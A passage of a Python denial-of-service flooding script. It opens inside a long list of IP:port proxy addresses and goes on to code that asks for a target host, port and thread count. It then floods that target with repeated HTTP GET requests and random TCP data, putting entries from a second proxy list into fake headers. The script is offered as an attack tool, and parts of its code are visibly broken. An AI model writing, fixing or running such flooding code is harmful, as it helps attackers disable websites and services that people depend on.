181.48.243.194:4153
202.131.159.58:5678
185.40.80.143:4153
186.219.96.47:49923
187.188.131.169:1080
185.151.146.178:1234
181.115.68.163:4145
192.64.115.90:25462
185.245.38.200:4145
185.196.176.77:4145
185.109.184.150:63819
178.250.70.218:1088
185.109.184.150:53155
185.18.198.163:38188
178.212.51.166:33333
178.79.165.164:40595
188.164.193.178:17585
187.95.82.146:3629
187.62.89.252:4153
178.128.82.105:53299
185.129.250.183:26777
177.85.65.177:4153
44.226.167.102:1080
44.226.167.102:80
44.226.167.102:3128
183.88.247.52:4153
202.173.220.18:45537
184.168.121.153:30167
185.18.198.163:55108
185.209.28.109:80
178.79.165.164:24324
178.72.90.70:5678
209.45.102.164:1080
182.93.69.74:5678
178.79.165.164:30918
186.248.87.172:5678
187.95.82.45:3629
187.102.78.181:4145
213.32.252.134:5678
185.43.249.148:39316
194.163.159.93:15816
188.165.252.198:10661
188.164.197.178:3756
188.164.193.178:11251
188.164.196.30:51284
192.169.226.96:50578
177.136.124.46:56113
188.164.197.178:31044
209.14.112.2:1080
188.92.110.174:1080
188.164.196.30:62564
188.165.237.26:52982
192.163.200.80:22179
188.164.196.31:49426
199.127.176.139:64312
192.169.226.96:31640
190.0.15.18:5678
195.168.91.238:4153
195.177.217.131:47213
198.57.195.42:31683
193.200.151.158:8192
216.154.201.132:54321
208.109.13.93:30042
194.31.79.75:17223
198.57.195.42:17986
191.34.253.74:4153
198.12.255.193:32216
209.14.112.4:1080
198.12.255.193:53281
195.74.72.111:5678
194.163.159.93:35081
192.163.202.88:19045
209.222.97.30:15805
198.12.255.193:22785
207.244.254.30:16491
192.163.200.80:61437
194.233.78.142:33148
209.126.104.38:40053
203.161.32.242:61070
213.226.11.149:59086
38.133.200.94:31596
207.180.198.241:13168
213.14.31.123:35314
203.96.177.211:52236
198.12.255.193:47365
202.131.159.26:5678
192.64.115.90:47100
192.163.201.131:60964
202.142.147.220:14888
37.18.73.60:5566
201.174.17.126:7755
192.163.202.88:10185
192.163.201.131:10185
192.163.202.88:60964
31.169.79.37:1080
201.93.159.234:4145
45.187.71.208:5678
203.161.32.242:50640
203.161.32.218:50640
203.96.177.211:61051
37.187.91.192:21981
209.126.104.38:16608
24.75.156.114:3366
208.109.14.49:35618
43.231.79.36:33333
209.222.97.30:2573
31.210.134.114:13080
208.109.14.49:50540
213.136.78.200:7412
36.37.244.41:5678
31.163.192.152:4153
208.109.14.49:63470
24.249.199.12:4145
31.24.44.92:50109
37.44.238.2:60796
37.187.91.192:27898
45.117.179.179:28482
50.250.56.129:9898
51.222.241.8:62916
50.199.46.20:32100
46.182.6.69:35770
64.49.67.166:5678
46.214.153.223:5678
51.38.63.124:27294
46.173.175.121:10801
46.109.146.244:4145
50.63.12.33:46599
5.58.47.25:3629
46.226.148.105:9352
45.81.232.17:27855
45.81.232.17:30717
46.182.6.69:56819
50.63.13.3:31503
54.36.122.16:39713
46.48.126.226:4153
68.71.247.130:4145
91.200.114.58:55749
18.130.220.28:8193
65.49.82.7:58195
50.63.12.101:61797
51.158.76.35:16379
51.68.164.77:16664
62.103.186.66:4153
50.63.12.33:45134
50.63.12.101:6095
50.63.12.33:23065
50.63.13.3:36060
5.252.23.206:1080
51.89.173.40:23854
5.188.66.181:8088
74.119.144.60:4145
60.217.64.237:35292
67.205.177.122:53344
64.227.108.182:14287
66.248.237.179:56740
66.228.33.190:44809
68.1.210.163:4145
67.227.186.83:63716
67.205.177.122:48949
82.193.103.54:5678
66.228.33.190:63715
37.187.91.192:27898
69.36.63.128:1080
92.204.134.38:34261
72.195.114.169:4145
92.204.135.203:29212
72.210.221.197:4145
82.223.121.72:11075
85.89.184.87:5678
88.202.230.103:46475
92.204.135.203:34780
38.113.171.88:57775
81.12.169.254:4153
31.24.44.92:52173
95.188.82.147:3629
12.158.87.26:39593
92.205.110.47:42356
92.204.134.38:1555
92.205.110.47:50709
91.134.140.160:3985
92.51.78.66:4153
37.18.73.60:5566
94.23.220.136:59161
88.202.230.103:39647
85.116.120.106:3629
94.23.220.136:35805
94.23.220.136:38629
92.204.134.38:15393
87.238.192.249:16016
78.128.95.125:4153
94.23.220.136:22893
1.4.195.114:4145
82.223.121.72:21955
91.150.189.122:60647
31.24.44.92:58815
91.205.131.110:53339
92.205.107.159:55495
94.131.107.45:1080
38.127.172.137:47421
87.238.192.249:25556
92.204.134.38:42571
96.36.50.99:39593
89.187.216.58:1080
93.117.72.27:55770
92.204.135.203:61635
92.204.134.38:59727
76.81.6.107:31008
82.204.198.28:1080
82.223.121.72:19985
36.37.189.64:5678
94.23.252.168:9180
81.16.248.246:25566
74.119.144.60:4145
36.37.244.41:5678
37.187.141.160:49039
45.81.232.17:23711
43.231.79.36:33333
51.222.241.8:37963
72.37.216.68:4145
93.171.241.18:1080
50.63.12.33:61464
45.238.57.1:3629
50.63.12.33:31785
80.92.227.185:5678
45.117.179.179:3547
54.36.122.16:44587
45.117.179.179:33164
51.68.164.77:16664
92.204.135.203:61635
45.117.179.179:33710
46.182.6.69:56819
87.238.192.204:63376
70.166.167.55:57745
51.75.71.110:57130
81.17.94.50:47163
103.123.70.83:5678
67.205.177.122:53344
51.15.234.222:16379
91.203.114.71:42905
50.63.13.3:60315
51.161.33.206:2542
51.161.33.206:26567
69.75.122.146:39593
104.37.12.129:1080
103.121.39.158:1080
92.204.135.203:10824
103.182.52.159:5678
50.63.13.3:40129
103.124.139.178:4145
67.225.255.197:55889
82.223.121.72:39434
65.49.82.7:58195
51.38.50.249:9224
50.63.12.101:2953
64.202.186.2:20189
92.204.136.149:11587
46.182.6.69:38780
54.36.122.16:39713
65.49.67.161:48324
51.222.241.157:43254
46.214.153.223:5678
80.51.7.66:4145
72.195.34.59:4145
92.204.134.38:25825
92.204.135.203:34780
92.204.134.38:7785
94.23.220.136:63665
92.204.134.38:28695
92.204.134.38:59727
92.204.134.38:56177
64.227.108.182:14287
81.210.61.2:65000
66.228.33.190:14791
103.124.137.251:1080
95.216.224.61:59792
107.180.90.248:39929
162.144.36.208:52517
162.55.87.48:5566
167.172.159.43:1162
184.170.245.148:4145
164.92.237.188:53364
154.16.116.166:2512
162.214.121.11:2993
165.227.104.122:41443
162.240.22.184:48026
159.223.166.21:1372
165.227.196.37:61899
199.229.254.129:4145
162.241.46.6:53477
147.182.194.76:29703
162.240.208.98:43704
162.240.231.211:46637
148.72.23.56:39396
165.227.104.122:29992
187.44.211.118:4153
192.162.232.15:1080
179.43.182.73:1080
109.69.0.179:5678
184.170.248.5:4145
185.186.17.57:5678
192.252.211.197:14921
192.163.202.88:19045
176.192.65.34:5020
192.163.202.88:64649
209.126.104.38:16608
201.174.17.126:7755
209.14.112.2:1080
188.165.252.198:10661
190.144.167.178:5678
142.54.239.1:4145
192.169.226.96:32074
188.164.197.178:15452
188.64.113.104:1080
188.164.193.178:11251
188.164.193.178:21264
192.169.226.96:43328
192.99.207.129:26567
212.115.232.79:10800
162.241.50.179:53755
178.250.70.218:1088
142.4.7.20:19045
164.92.86.113:52494
87.126.141.10:4145
190.109.72.10:33633
162.241.46.40:34172
213.136.79.177:22680
54.36.122.16:39713
198.12.253.1:62302
203.96.177.211:22280
190.4.209.58:4153
198.12.253.239:64741
104.200.135.46:4145
162.214.197.102:51918
188.164.197.178:3756
104.200.152.30:4145
185.109.184.150:49319
67.227.186.23:64153
200.122.92.211:5678
202.131.159.58:5678
208.109.13.93:53778
209.142.64.219:39789
147.124.212.31:13276
103.85.103.1:5678
209.222.97.30:62543
18.130.220.28:8193
192.169.226.96:7251
213.136.78.200:39272
209.222.97.30:2573
103.235.66.198:5678
203.210.235.91:5678
209.126.104.38:40053
187.62.89.252:4153
203.161.32.218:55761
162.241.50.179:57364
213.16.81.182:35559
213.136.78.200:19925
139.162.238.184:47310
179.43.182.73:1080
216.10.242.18:30670
91.213.119.246:46024
178.212.51.166:33333
91.203.114.71:42905
192.169.226.96:51778
187.16.255.69:4153
203.205.34.58:5678
222.124.135.123:5678
195.164.138.34:1080
24.37.245.42:51056
103.53.110.45:10801
166.62.38.100:42126
50.63.12.33:45134
67.225.255.197:55889
67.205.177.122:24777
50.63.12.33:9367
209.126.104.38:44412
70.166.167.55:57745
132.148.16.169:27399
142.54.236.97:4145
62.109.0.18:24302
176.192.65.34:5020
104.238.111.107:53777
162.214.170.144:6984
86.110.189.154:4145
82.223.121.72:11075
187.141.129.86:4153
162.214.170.144:31701
162.214.121.173:62976
92.205.110.118:5513
107.180.101.226:49590
146.59.18.246:30673
162.214.121.11:18809
138.197.92.110:57786
162.241.79.22:41641
46.109.146.244:4145
107.180.90.88:55347
192.163.202.88:64649
165.227.196.37:63551
45.81.232.17:41792
192.169.226.96:32074
51.222.241.8:37963
31.170.22.127:1080
162.241.46.69:34236
132.148.16.169:27718
190.108.84.168:4145
102.69.177.242:10081
103.197.32.205:5678
51.15.241.5:16379
27.65.240.157:1080
161.97.170.209:6647
185.40.80.143:4153
162.241.46.40:41442
46.182.6.69:22907
66.228.33.190:7841
192.140.42.83:59057
162.214.170.144:47558
78.83.242.229:4145
162.241.46.6:61579
222.223.112.59:10800
70.35.213.226:4153
83.56.15.57:5678
103.40.122.194:1080
103.72.79.250:21801
162.241.46.69:46849
185.51.92.103:51327
173.212.209.49:59054
31.210.134.114:13080
162.214.170.144:53548
201.158.120.44:45504
162.144.103.99:60415
118.172.47.97:51327
72.167.221.145:50335
187.210.136.88:4153
138.59.177.117:5678
74.56.228.180:4145
186.145.192.251:5678
51.222.241.8:49559
67.205.177.122:53344
195.138.65.34:5678
192.252.220.92:17328
81.17.94.50:47163
189.203.181.34:1080
66.228.33.190:32118
38.133.200.94:31596
174.136.57.169:33761
50.250.56.129:9898
132.148.128.8:22115
96.36.50.99:39593
132.148.16.169:55610
148.72.209.174:39577
72.195.34.58:4145
184.170.248.5:4145
162.241.53.72:57364
192.163.202.88:60964
142.54.226.214:4145
154.79.246.18:9898
107.180.88.173:30125
110.164.241.194:4153
178.212.48.84:1080
188.164.197.178:11925
209.14.112.8:1080
162.241.46.6:56241
185.103.178.242:4145
94.23.220.136:7811
92.205.107.159:57238
144.76.96.180:5566
198.12.253.1:62302
92.204.134.38:25675
92.204.134.38:1555
66.228.37.252:46695
192.163.200.93:22179
138.197.92.110:4527
159.89.194.121:60322
162.214.121.173:44826
122.252.179.66:5678
187.95.82.146:3629
51.89.173.40:44719
107.180.88.173:59609
67.205.177.122:64131
222.165.234.242:41541
132.148.245.169:36149
162.241.50.179:37876
162.214.90.49:34409
148.72.209.174:12446
66.228.37.252:36702
176.120.32.135:5678
162.241.46.6:62244
198.12.255.193:48572
162.214.90.49:32207
91.92.78.207:4145
51.89.173.40:30199
50.63.12.33:50781
132.148.245.112:38117
209.126.104.38:39369
146.59.18.246:49871
50.63.12.33:14738
107.180.88.173:24766
162.214.191.209:60768
162.241.45.22:51867
162.144.32.209:61329
164.92.86.113:63536
164.92.86.113:50393
103.68.3.114:4145
213.136.79.177:13675
103.165.175.71:5678
162.214.170.144:33394
192.252.209.155:14455
164.92.86.113:57552
181.209.103.98:5678
199.102.106.94:4145
104.248.158.78:11740
66.228.35.209:17464
87.238.192.249:25556
162.214.170.144:27510
104.238.111.107:29015
166.62.88.163:49263
67.227.186.23:57676
187.252.154.90:4153
148.72.23.56:3260
12.218.209.130:13326
188.164.193.178:17585
164.92.86.113:54597
128.199.196.31:56619
51.75.71.110:57130
162.241.50.179:62192
161.97.173.78:35981
3.9.71.167:3128
50.63.13.3:56571
135.148.10.161:31696
103.182.52.159:5678
185.136.150.252:4145
192.111.139.165:4145
46.173.35.229:3629
148.72.23.56:4833
162.214.154.178:32753
103.234.128.70:38157
213.74.223.72:4153
37.18.73.60:5566
142.54.231.38:4145
199.102.105.242:4145
148.72.206.84:14815
199.102.104.70:4145
195.219.98.27:5678
49.229.36.210:4153
18.133.16.21:80
112.2.21.18:51080
46.188.104.108:1080
107.180.90.88:46287
192.169.226.96:50578
95.178.108.189:5678
72.167.221.157:13866
132.148.128.8:22773
3.10.93.50:3128
65.49.82.7:58195
181.48.193.42:2580
162.144.36.208:27531
92.204.134.38:54467
13.40.239.130:3128
72.167.222.113:4125
188.164.196.30:64988
109.167.134.253:44788
92.204.134.38:28695
148.72.212.183:39456
190.2.115.33:4153
72.167.220.46:28810
138.68.155.22:44660
107.181.168.145:4145
174.64.199.82:4145
88.213.214.254:4145
181.143.21.146:4153
185.18.198.163:38188
18.135.133.116:3128
92.205.110.118:42086
176.113.157.149:37417
139.162.238.184:29870
138.68.155.22:36259
96.70.52.227:48324
45.187.71.208:5678
132.148.167.243:55423
177.85.65.177:4153
162.241.50.179:57495
107.180.88.173:36503
50.63.12.33:34644
178.215.163.218:4145
162.214.191.209:33977
51.222.241.8:7822
92.204.134.38:42674
109.123.254.43:51888
109.238.12.156:26912
203.161.32.242:50640
188.164.197.178:4026
116.118.98.21:5678
82.209.165.206:4153
67.205.177.122:14108
192.163.201.131:10185
24.249.199.4:4145
198.12.253.239:38588
104.238.111.107:21453
185.22.8.70:1080
162.241.46.40:33268
104.37.12.129:1080
23.19.244.109:1080
148.72.23.56:30845
51.79.87.144:18636
186.10.102.218:5678
166.62.38.100:8730
104.251.212.206:6106
138.68.155.22:3467
45.138.87.238:1080
31.43.63.70:4145
213.136.78.200:7412
159.148.146.65:5678
91.199.139.246:1111
98.103.88.158:46104
45.189.151.19:33333
54.36.122.16:29796
168.194.75.98:8888
203.96.177.211:52236
162.214.154.176:32210
161.97.163.52:49493
162.214.90.49:44916
186.103.143.213:4153
103.96.38.161:80
192.158.15.201:50877
103.131.8.37:5678
161.97.170.209:2150
93.175.194.155:3629
177.85.205.173:3629
92.204.135.203:29212
60.217.64.237:35292
198.57.195.42:38242
185.43.249.148:39316
36.64.62.111:5678
162.144.103.99:2291
94.23.220.136:35805
45.81.232.17:30696
139.162.238.184:13302
114.4.241.210:5678
92.204.135.37:26545
36.88.123.218:5678
187.44.211.118:4153
213.136.79.177:32930
162.240.147.147:44487
159.192.121.240:4145
148.72.215.79:13305
77.238.79.111:5678
92.204.134.38:43044
186.190.228.83:4153
146.59.70.29:8446
31.200.242.201:4531
50.63.13.3:14920
98.162.25.16:4145
190.54.12.74:5678
87.238.192.249:11120
85.29.147.90:5678
62.109.0.18:24101
51.89.173.40:14179
212.103.118.77:5678
192.111.135.18:18301
81.12.169.254:4153
192.111.137.35:4145
162.214.121.173:64382
192.163.201.131:47585
94.23.252.168:9180
199.102.107.145:4145
132.148.167.243:31139
162.214.121.173:31179
162.241.45.22:30747
162.214.170.144:39503
38.242.251.177:15562
147.124.212.31:16844
51.89.173.40:27887
51.159.221.176:8635
162.241.45.22:50207
146.59.70.29:50336
165.227.196.37:63742
37.32.98.160:43813
45.6.101.98:4153
142.54.232.6:4145
91.247.250.215:4145
212.115.232.79:10800
5.61.41.220:1080
94.131.14.66:1080
51.38.63.124:27294
173.224.20.136:5678
185.23.118.252:55158
47.176.213.210:39593
162.241.46.6:53477
88.202.230.103:39647
64.227.108.182:14287
82.130.202.219:43429
162.214.75.79:52163
66.228.37.252:46648
89.151.251.50:32000
192.111.139.163:19404
186.251.255.21:31337
67.201.59.70:4145
12.158.87.26:39593
50.63.12.33:31785
41.184.212.3:4153
104.238.111.107:56225
190.104.219.147:4153
37.18.73.60:5566
24.75.156.114:3366
64.124.145.1:1080
181.143.21.146:4153
46.173.35.229:3629
190.249.169.153:3629
213.172.89.227:4153
154.72.73.214:1080
85.29.147.90:5678
105.29.93.193:4145
91.200.114.58:55749
121.200.62.246:4153
103.121.62.2:5678
103.174.36.112:5678
72.210.221.223:4145
195.74.72.111:5678
37.187.91.192:11721
103.124.137.251:1080
37.187.91.192:27898
200.105.192.6:5678
78.83.242.229:4145
5.58.47.25:3629
103.225.221.18:5678
95.143.8.182:50285
128.140.161.126:3629
81.17.94.50:47163
58.18.39.58:10800
61.148.199.206:4145
103.95.97.42:4153
110.77.149.227:4153
110.74.195.2:4153
116.118.98.25:5678
118.67.223.4:5678
125.70.227.214:10800
175.100.47.191:5678 """]
ip = str(input('Target >>/ = '))
ip = socket.gethostbyname(ip)
port = int(input('Port >>/ = '))
sends = int(input('Time >>/ = '))
num_threads = int(input('Threads >>/ = '))
message_size = 1024 * 10
def randomip():
    randip = [random.randint(1, 4055) for _ in range(15555)]
    randip_str = ".".join(map(str, randip))
    return randip_str
def flooder():
    global sock3, sock4, addr
    sock3 = [192, 168, 0, 1]
    sock4 = random._urandom(10999)
    addr = "."
    sock3[0] = str(random.randrange(18928))
    sock3[1] = str(random.randrange(18928))
    sock3[2] = str(random.randrange(18928))
    sock3[3] = str(random.randrange(18928))
    sock3[4] = str(random.randrange(18928))
    addres = sock3[0] + addr + sock3[1] + addr + sock3[2] + addr + sock3[3] + addr + sock4[4] + addr + "\r\n"
    return addres
def start():
    global useragents, Socks4
    xx = "."
    xb = int(0)
    Sockx4 = "Sock4: "+random.choice(Socks4)+"\r\n"
    useragent = "useragents: "+random.choice(useragents)+random.choice(Socks4) + "\r\n"
    content = "Content-Type: application/x-www-form-urlencoded\r\n"
    length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
    host1 = "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1"
    bypass_user = Sockx4 + host1 + useragent + host1 + length + content + "\r\n"
    
    while True:
        try:
            for _ in range(1024):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                s.send(str.encode(bypass_user))
                for _ in range(sends):
                    payload = "GET / HTTP/1.1\r\nHost: " + ip + "\r\nUser-Agent: " + get_random_sock4() + "\r\n\r\n"
                    s.send(str.encode(payload))
                s.close()  # Menutup koneksi setelah selesai
                xb += random.randint(0, int(sends))
        except Exception as e:
            print(f"Error in start function: {e}")

def tcp_flooder():
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.connect((ip, port))
                while True:
                    message = random._urandom(message_size)
                    sock.sendall(message)
                    time.sleep(0.001)  # Mengatur kecepatan pengiriman
        except Exception as e:
            print(f"Error in tcp_flooder function: {e}")

def get_random_sock4():
    to_sock4 = [""" 45.90.216.44:4444
45.95.203.232:4444
129.213.150.205:80
45.95.203.201:4444
175.29.174.242:10800
45.95.203.100:4444
45.144.65.30:4444
140.238.207.22:80
174.77.111.196:4145
103.112.162.241:5678
185.79.241.34:42756
199.187.210.54:4145
185.18.198.163:3833
45.95.203.114:4444
185.220.174.99:17886
82.146.45.136:3128
162.241.137.197:32930
135.148.10.161:5607
8.217.234.228:6915
143.110.232.177:80
171.226.88.123:25418
72.195.34.41:4145
35.211.204.74:80
196.44.181.37:5678
161.97.147.193:12762
98.162.25.7:31653
176.118.52.129:3629
171.226.88.123:25466
117.160.250.163:81
46.36.70.104:46964
194.4.50.94:12334
171.226.88.123:24146
45.95.203.176:4444
119.28.60.64:8090
154.65.39.7:80
117.160.250.133:80
113.208.119.142:9002
47.254.57.237:8080
209.142.64.219:39789
85.214.107.177:80
190.57.131.158:1080
162.214.227.68:30758
89.58.45.94:36263
156.232.9.194:8080
192.111.129.145:16894
148.72.210.123:48637
98.162.25.29:31679
103.115.20.52:8199
183.60.141.17:443
162.214.191.59:33977
171.226.88.123:30990
103.54.59.65:80
165.227.196.37:56755
130.35.221.237:3128
159.223.166.21:45537
184.178.172.23:4145
103.59.190.209:56252
95.111.227.164:51610
92.205.110.47:17158
13.81.217.201:80
92.204.136.149:31551
192.241.247.237:1234
199.102.105.242:4145
67.205.177.122:43529
62.171.131.101:41055
192.111.135.17:18302
184.178.172.23:4145
192.252.214.20:15864
72.217.158.202:4145
206.189.145.23:63625
173.212.237.43:25041
1.179.151.165:31948
72.210.221.223:4145
179.1.85.202:999
103.73.66.36:8085
147.182.180.242:80
162.240.147.147:33894
219.243.212.118:8443
148.72.209.174:38088
178.128.113.118:23128
34.175.101.255:80
138.36.150.16:1080
207.180.198.241:35139
167.172.100.244:11562
166.62.38.100:54083
161.97.163.52:60570
208.109.14.49:37377
111.90.150.109:1080
158.179.213.254:3128
161.97.163.52:2444
185.18.198.163:38188
202.131.159.58:5678
115.85.85.162:5678
184.178.172.14:4145
161.97.147.193:55283
161.97.147.193:1599
172.93.213.177:80
194.163.129.90:43076
209.13.96.165:39921
117.4.242.216:5678
72.10.160.90:3325
89.163.146.104:8081
5.252.23.206:1080
212.47.245.57:16379
175.139.200.17:4153
132.148.128.8:10008
144.91.68.111:24407
173.212.237.43:29319
171.247.171.162:4009
47.74.152.29:8888
41.231.37.76:3128
67.201.59.70:4145
199.116.114.11:4145
132.148.16.169:13040
54.37.75.99:23401
72.210.252.137:4145
185.18.198.163:58714
139.59.1.14:8080
194.44.208.62:80
148.72.212.198:9226
94.23.220.136:22893
46.17.104.163:4444
128.140.26.12:80
162.241.158.204:44651
108.7.232.77:3128
104.200.152.30:4145
138.59.177.117:5678
37.27.32.80:80
185.23.118.97:57445
45.144.65.21:4444
178.63.230.135:80
199.58.185.9:4145
152.228.134.212:15444
84.39.112.144:3128
109.238.12.156:29298
51.158.108.134:16379
192.252.209.155:14455
188.34.179.101:80
202.124.43.251:4145
35.243.227.100:80
199.102.107.145:4145
192.252.220.89:4145
43.129.195.235:443
139.162.238.184:39652
194.163.159.94:46195
192.169.226.96:4850
135.148.10.161:41146
138.197.92.110:9095
68.71.249.153:48606
163.172.171.22:16379
5.161.103.113:80
103.123.238.153:80
82.223.121.72:15464
92.204.136.149:9328
154.18.220.190:5678
72.195.34.41:4145
116.233.89.144:4145
20.187.127.130:2028
188.40.44.95:80
178.128.82.105:39993
47.56.110.204:8989
162.241.6.97:31034
159.65.77.168:8585
67.43.236.20:14167
51.75.74.18:80
95.111.227.164:30845
209.14.112.1:1080
184.168.121.153:13991
203.98.76.139:4153
161.97.173.78:49145
45.81.232.17:50946
51.15.132.215:16379
66.42.224.229:41679
45.95.203.129:4444
165.227.147.238:3128
158.51.210.75:7777
111.68.31.134:40385
103.200.20.56:3128
89.58.45.94:39682
154.72.67.190:8080
194.233.78.142:35513
122.248.46.26:4145
162.241.66.135:55109
192.111.139.165:4145
163.172.147.89:16379
95.165.163.188:36496
142.54.231.38:4145
92.255.190.64:4153
51.222.241.8:37963
172.82.90.29:80
187.188.169.169:59329
93.125.114.187:3128
171.226.88.123:31318
41.223.136.162:80
109.238.12.156:26912
206.189.145.23:49614
182.52.108.58:3629
184.181.217.220:4145
171.244.140.160:26892
144.48.37.141:3128
103.72.79.250:21801
38.68.134.189:3128
185.215.53.201:3629
148.72.23.56:60069
72.210.252.134:46164
49.4.48.128:8888
213.149.182.98:8080
194.163.137.106:9050
47.245.56.108:18181
162.241.46.40:60708
185.18.198.163:3833
68.71.247.130:4145
188.164.196.31:62966
37.18.73.60:5566
43.156.112.72:15673
95.111.227.164:53625
216.137.184.253:80
47.251.44.241:8080
45.95.203.200:4444
58.234.116.197:8193
183.60.141.41:443
192.252.220.89:4145
162.241.46.6:50062
137.184.182.145:56363
36.37.244.41:5678
45.83.104.231:80
51.15.234.222:16379
209.126.104.38:43012
46.98.191.58:1111
98.162.25.7:31653
203.96.177.211:22280
212.58.131.3:1080
103.229.83.106:6789
171.226.88.123:25394
142.93.2.222:8000
163.172.131.178:16379
103.124.137.251:1080
198.12.255.193:49156
162.241.158.204:61034
103.211.51.168:80
35.185.196.38:3128
108.181.132.117:54801
82.180.139.155:80
39.101.65.228:4153
144.91.77.153:3128
69.167.169.46:38366
171.226.88.123:25434
192.252.211.197:14921
194.233.78.142:37870
72.210.252.137:4145
5.39.69.35:32054
154.66.109.41:10081
51.15.212.207:16379
132.148.245.169:58674
139.162.166.167:43941
45.81.232.17:27855
62.162.90.212:80
194.163.159.93:2103
72.210.208.101:4145
123.182.59.152:8089
74.48.7.43:80
114.141.61.2:4145
184.170.245.148:4145
43.229.85.48:49665
116.63.129.202:6000
205.177.85.130:39593
179.24.196.56:3128
165.225.72.154:10801
45.95.203.138:4444
128.199.221.91:33564
185.139.228.188:80
161.97.165.57:6484
199.102.104.70:4145
13.213.50.225:8080
45.189.151.19:33333
91.134.140.160:40482
103.131.232.9:80
192.252.208.67:14287
128.199.221.91:8004
98.162.25.4:31654
162.214.227.68:54331
82.64.77.30:80
173.212.209.49:13025
185.95.199.103:1099
183.214.203.219:8060
72.10.160.90:25367
192.111.139.163:19404
43.134.117.194:15673
171.226.88.123:31070
139.99.148.90:3128
208.109.14.49:63470
38.242.199.111:8781
5.161.144.46:3128
171.226.88.123:24178
114.156.77.107:8080
162.214.102.121:57144
79.101.45.94:56921
132.148.128.8:16012
185.186.242.135:3128
154.95.1.222:6744
148.72.215.230:54405
45.231.29.75:4153
72.195.34.60:27391
98.178.72.21:10919
162.241.46.40:33268
163.172.147.89:16379
50.63.13.3:55749
67.201.33.10:25283
67.210.146.50:11080
184.168.121.153:10395
1.224.3.122:3889
51.75.126.150:64296
8.213.128.6:8060
89.58.45.94:43659
123.200.6.58:5678
67.205.177.122:40448
51.75.126.150:51713
165.227.196.37:63399
47.251.44.241:8080
111.225.152.24:8089
45.144.65.10:4444
184.170.248.5:4145
45.90.219.34:4444
192.99.5.161:8081
173.212.209.49:18421
109.238.12.156:50539
45.90.218.210:4444
161.97.147.193:2838
89.35.237.187:8888
148.72.209.174:49816
142.93.14.238:8888
5.189.158.162:3128
89.218.5.109:50733
117.160.250.132:8899
138.68.3.159:3128
92.204.134.38:42674
115.76.197.44:51406
45.144.65.13:4444
123.182.59.52:8089
103.248.120.5:8080
83.220.168.57:10103
92.205.110.47:17158
37.52.50.28:5678
58.69.183.78:8081
195.248.243.149:7237
109.123.254.43:1381
147.124.212.31:50460
47.76.81.55:80
80.87.196.96:3128
45.95.203.209:4444
203.19.38.114:1080
185.18.198.163:58714
45.90.218.209:4444
120.234.203.171:9002
186.148.181.70:999
190.239.220.119:999
109.123.254.43:51888
45.144.65.45:4444
47.254.57.237:8080
51.158.96.66:16379
162.214.165.203:80
103.232.213.54:80
72.37.216.68:4145
162.240.22.184:48026
51.77.64.139:3128
213.136.75.85:50238
134.122.183.138:3128
51.89.173.40:11058
45.95.203.139:4444
181.212.136.34:15973
93.171.241.18:1080
103.26.110.46:84
161.35.70.249:3128
109.238.12.156:53938
51.75.125.208:50628
67.217.61.162:80
47.89.184.18:3128
112.99.7.108:8060
208.109.14.49:34700
162.214.121.173:52577
72.206.181.105:64935
103.13.204.143:8090
184.181.217.201:4145
104.238.111.107:36049
41.24.249.129:31281
103.148.45.175:1212
103.184.56.130:8080
45.11.95.165:6009
161.97.163.52:2589
221.151.181.101:8000
50.63.13.3:28732
104.248.151.220:63648
162.214.170.144:31701
103.124.139.178:4145
167.86.69.142:36394
23.152.40.15:5050
117.160.250.163:9990
213.136.75.85:50238
83.110.78.201:8081
192.111.134.10:4145
162.214.121.173:64579
188.191.164.55:4890
51.161.33.206:40132
128.199.221.91:7176
45.186.106.159:999
192.111.138.29:4145
24.121.173.151:3128
117.160.250.138:8899
130.255.162.199:44234
198.12.255.193:53281
5.75.192.13:80
168.196.158.15:1080
173.212.237.43:29319
62.112.9.233:12383
112.202.238.99:8082
107.180.91.0:52613
217.138.220.50:3128
72.210.221.197:4145
45.95.203.226:4444
58.57.2.46:10800
161.97.163.52:45725
162.241.46.6:46097
37.1.199.18:80
103.65.214.144:8080
162.241.79.22:55610
91.201.240.84:5678
37.187.91.192:27898
110.74.195.239:51080
112.51.96.118:9091
162.241.46.54:62797
208.109.14.49:30993
93.182.76.244:5678
222.138.76.6:9002
65.21.188.18:8080
212.110.188.193:34409
120.48.62.239:8080
207.180.198.241:13168
167.250.181.133:999
162.214.121.173:33572
103.130.106.81:83
184.181.217.206:4145
166.62.38.100:8730
85.173.165.36:46330
159.223.71.71:59159
159.89.175.22:8888
181.28.111.161:8080
58.136.123.30:3128
98.170.57.231:4145
199.58.185.9:4145
142.54.229.249:4145
38.49.150.212:80
36.89.85.249:5678
162.241.45.22:59219
94.72.100.20:2128
98.162.25.23:4145
161.97.173.78:28092
45.87.43.152:80
8.243.162.242:999
150.136.251.24:80
162.214.191.209:60768
119.148.31.185:9990
72.10.160.93:1301
125.167.33.208:8080
200.25.254.174:35010
104.236.0.129:50503
41.193.81.7:80
94.23.220.136:21062
79.98.1.32:34746
137.184.182.145:61089
45.11.95.165:5215
92.204.134.38:52929
162.240.22.184:43494
181.129.183.19:53281
103.6.223.2:3128
72.10.160.94:1123
154.72.73.226:4145
117.160.250.132:80
103.144.18.137:2002
51.89.14.70:80
98.181.137.83:4145
103.76.12.58:3128
171.226.88.123:25466
194.4.50.61:12334
82.193.103.54:5678
62.109.0.18:24301
118.172.239.231:8180
132.148.16.169:11320
144.91.66.30:58397
159.223.166.21:25154
123.182.58.238:8089
45.88.90.199:3128
51.89.173.40:51612
162.214.162.156:46369
125.18.149.20:80
69.160.223.33:8181
124.106.228.30:8080
162.241.6.97:33098
162.241.46.40:61579
213.207.43.183:443
202.152.24.50:8080 """]
    return random.choice(to_sock4)

if __name__ == "__main__":
    # Menjalankan kedua fungsi secara bersamaan
    import threading
    thread1 = threading.Thread(target=start)
    
    thread1.start()